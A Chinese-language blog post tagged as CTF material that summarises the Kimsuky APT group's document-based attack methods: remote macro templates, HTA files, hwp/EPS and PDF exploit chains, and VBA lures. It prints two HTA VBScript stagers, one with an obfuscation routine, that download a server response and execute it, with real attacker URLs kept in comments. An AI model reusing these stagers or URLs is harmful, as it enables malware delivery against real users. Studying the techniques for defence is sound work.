---
title: Office宏病毒
date: 2023-08-29 10:19:49
categories: CTF
tags: [Virus]
---

> [东北亚APT-kimsuky](https://blog.nsfocus.net/apt-kimsuky-2/)， 被认为来自朝鲜 

## 1.利用Office模板

### 简介

模板具有特殊的文件格式，Word 2003 模板的文件扩展名为 .dot，Word 2007 及 Word 更高版本的模板文件的扩展名为 .dotx或 .dotm；dotx 为不包含 VBA 代码的模板；dotm 模板可以包含 VBA代码。

创建模板后，可以通过模板文件的图标来区分模板是否可以包含 VBA代码。

图标上带有叹号的模板文件，表示可以包含 VBA 代码；反之，图标上未带有叹号的模板文件，表示不能包含VBA 代码。

### 加载远程模板和恶意宏分离：

 2020年4月，Kimsuky利用韩国议会选举的热度[1]，投递了名为《第21届国民议会选举相关》的诱饵文档。该文档打开后会加载一个包含恶意宏的远程dotm模板，只有当dotm文件成功加载后，office才会提示用户启用宏。这种方法将初始钓鱼文档和包含恶意宏的远程文档分离，起到保护作用，因为初始文档除了加载远程模板外，并没有其他恶意行为。 

 

## 2.利用Hta

  HTML Application ， 由 Microsoft 创建 的文件格式， 允许 Web 技术（如 HTML、JavaScript 和 VBScript）创建独立的可执行应用程序像exe那样执行。 

 .hta 合法目的一般是用来创建简单的桌面应用程序 ，但它可以访问计算机上的文件、注册表等资源， 被滥用作为恶意攻击的工具。由mshta.exe执行。 

```html
<html>
<script language="vbscript">
On Error Resume Next
Set Posto = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Posto.open "GET", "baidu.com", False
' http://hpurusymireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1
Posto.send
to = Posto.responseText
Execute(to)
</script>
</html>

<html>
<!--一个简单的子序列拼接函数-->
<!--输入'123456789abcdefghiklm'-->
<!--输出''1a2b3c4d5e6f7g8h9iklm''--> 
<script language="vbscript">
On Error Resume Next

Function cooo(c)
    L = Len(c)
    s = ""
    d = 9
    For jx = 0 To d - 1
        For ix = 0 To Int(L/d) - 1
            s = s & Mid(c, ix*d+jx+1, 1)
        Next
    Next
    s = s & Right(c, L - Int(L/d) * d)
    cooo = s
End Function

Set Posto = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Posto.open "GET", "baidu.com", False
' https://christinadudley.com/public_html/edudley/sites/default/files/1203427/expres.php?op=1
Posto.send
to = Posto.responseText
to = cooo(to)
Execute(to)
</script>
</html>
```

### 延迟执行：

 某些变种在设置使用mshta下载hta的计划任务时，会令其不立即启动，以对抗某些单个程序运行时间受限的沙箱。 

## 3.触发链

 2019年3月，Kimsuky利用韩日在二战赔偿问题上的僵持局面，伪装成韩国外交部投递了名为“20190312日本每日趋势”的hwp诱饵文档 

### 韩国hwp eps

 hwp是韩国hansoft开发的hangul办公软件使用的文档   EPS(Encapsulated PostScript)， 这种脚本是Adobe推出的PostScript脚本（一种用于初版行业的打印机编程语言）的分支 ， 可以被利用来包含恶意代码。

```
hwp->eps->powershell-->wsf-->js-->恶意组件
```



## 4.利用pdf文档

 Kimsuky在今年5~8月转而使用携带漏洞的恶意pdf文档，借用南北议题作为诱饵对韩国政府人员进行攻击 

```
pdf-->adobe acrobat漏洞cve-2020-9715触发--->内嵌隐藏的恶意JS->解密pe
文件-->内存加载执行
```



## 5.VBS和VBA

 VBA (Visual Basic for Applications) 和 VBS (VBScript) 都是基于 Visual Basic 语言的脚本语言， 

VBS 通过wscript.exe（图形版）或者cscript.exe（命令行版）执行。

 **VBA**：主要用于 Microsoft Office 应用程序（如 Excel、Word、Access）中的宏编程。 

 2020年6月，Kimsuky投递名为“朝鲜加强核战争威慑的措施及韩国的应对”的诱饵邀稿函，让目标就朝鲜第七届中央军事委员会，撰写文章进行评价与展望 

技术特点：关键命令并不位于vba宏里，因此直接对宏进行静态检测将难以发现威胁 

形式特点： 当用户点击启用内容后，真实表格才会显示出来 。